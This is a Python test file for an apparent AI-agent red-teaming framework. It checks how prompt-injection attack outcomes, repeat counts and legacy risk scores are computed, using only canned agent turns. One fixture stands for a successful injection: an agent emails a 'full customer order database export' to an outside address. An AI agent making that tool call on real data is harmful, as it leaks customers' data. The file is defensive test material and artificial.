"""Canned trace compatibility checks; no models or live targets."""
from __future__ import annotations

import pytest
from pydantic import ValidationError

from talos.attacks.models import AttackInstance
from talos.execution.scoring import LegacyEvaluation, Severity, score_attack, score_attack_detailed
from talos.harness.base import AgentTurnResult, TargetAgent, ToolCallRecord
from talos.reporting.report import LEGACY_RISK_VERSION, SeverityCounts, compute_risk_score, risk_score_legacy
from talos.scripts.research_eval import SweepResult, TemplateAttempt, mcnemar_test


class CannedAgent(TargetAgent):
    def __init__(self, turns):
        self.turns = iter(turns)
        self.calls = 0
    def connect(self):
        raise AssertionError("no connections")
    def list_tools(self):
        raise AssertionError("no discovery")
    def send(self, message, history=None):
        self.calls += 1
        return next(self.turns).model_copy(deep=True)


def turn(kind):
    calls = {
        "success": [ToolCallRecord(tool_name="send_email", arguments={
            "to": "test@outside.example", "body": "Full customer order database export",
        }, result={"status": "test-only"})],
        "partial": [ToolCallRecord(tool_name="issue_refund", arguments={"order_id": "1001", "amount": 0})],
        "fail": [],
    }
    return AgentTurnResult(response="canned-test-only", tool_calls_made=calls[kind])


def attack():
    return AttackInstance(template_id="test-only", exploit_class="direct_injection", name="canned",
                          target_tool="send_email", messages=["test message"])


def test_legacy_capture_preserves_original_return_schema_and_every_repeat():
    turns = [turn(k) for k in ["success", "partial", "fail"]]
    detailed = score_attack_detailed(CannedAgent(turns), attack(), repro_runs=3)
    legacy = score_attack(CannedAgent(turns), attack(), repro_runs=3)
    assert detailed.finding.model_dump() == legacy.model_dump()
    assert set(legacy.model_dump()) == {
        "template_id", "exploit_class", "name", "target_tool", "origin", "outcome", "severity",
        "data_exposure", "financial_impact", "irreversibility", "reproducibility", "evidence", "messages",
    }
    assert legacy.outcome == "success" and legacy.severity == Severity.HIGH
    assert legacy.reproducibility == 0.33 and (detailed.k, detailed.n) == (1, 3)
    assert [r.outcome for r in detailed.repeats] == ["success", "partial", "fail"]
    assert [r.repeat_index for r in detailed.repeats] == [0, 1, 2]
    assert detailed.repeats[1].execution.turns[0].tool_calls_made[0].arguments["amount"] == 0
    encoded = detailed.model_dump_json()
    assert LegacyEvaluation.model_validate_json(encoded).model_dump_json() == encoded


def test_exact_count_is_not_reconstructed_from_rounded_rate():
    agent = CannedAgent([turn("success")] + [turn("fail")] * 200)
    packet = score_attack_detailed(agent, attack(), repro_runs=201)
    assert packet.k == 1 and packet.n == agent.calls == 201
    assert packet.finding.reproducibility == 0.0  # historical rounding preserved
    assert packet.finding.outcome == "success" and len(packet.repeats) == 201


@pytest.mark.parametrize("runs", [0, -1, 1])
def test_legacy_minimum_one_repeat_behavior_preserved(runs):
    agent = CannedAgent([turn("fail")])
    packet = score_attack_detailed(agent, attack(), repro_runs=runs)
    assert packet.n == agent.calls == 1 and packet.k == 0


def test_legacy_tool_error_not_silently_rejudged_as_v2():
    t = turn("success")
    t.tool_calls_made[0].result = {"error": "synthetic failed tool"}
    assert score_attack(CannedAgent([t]), attack(), repro_runs=1).outcome == "success"


def test_legacy_packet_rejects_fabricated_counts():
    packet = score_attack_detailed(CannedAgent([turn("fail")]), attack(), repro_runs=1)
    payload = packet.model_dump()
    payload["k"] = 1
    with pytest.raises(ValidationError):
        LegacyEvaluation.model_validate(payload)


def test_versioned_legacy_risk_alias_preserves_formula():
    assert risk_score_legacy is compute_risk_score
    assert LEGACY_RISK_VERSION == "talos.risk.severity-sum.v1"
    assert risk_score_legacy(SeverityCounts(low=1)) == 2
    assert risk_score_legacy(SeverityCounts(high=7, medium=5)) == 100
    assert risk_score_legacy(SeverityCounts()) == 0


def test_mcnemar_still_uses_at_least_one_success_when_majority_failed():
    def sweep(k):
        a = TemplateAttempt(template_id="test-only", exploit_class="direct_injection", target_tool="test-tool",
                            k=k, n=5, outcome="success" if k else "fail", severity="low" if k else "none")
        return SweepResult(target="offline-test", adapter="test", repro_runs=5, attempts=[a])
    result = mcnemar_test(sweep(1), sweep(0))
    assert result["success_before_fail_after"] == 1 and result["both_fail"] == 0
    assert "at least one success" in mcnemar_test.__doc__


def test_legacy_capture_snapshots_a_reused_agent_turn():
    class ReusingAgent(CannedAgent):
        def __init__(self):
            self.shared = turn("success")
            self.calls = 0
        def send(self, message, history=None):
            if self.calls:
                self.shared.tool_calls_made.clear()
            self.calls += 1
            return self.shared
    result = score_attack_detailed(ReusingAgent(), attack(), repro_runs=2)
    assert [r.outcome for r in result.repeats] == ["success", "fail"]
    assert len(result.repeats[0].execution.turns[0].tool_calls_made) == 1
    assert result.repeats[1].execution.turns[0].tool_calls_made == []
    assert (result.k, result.n) == (1, 2)
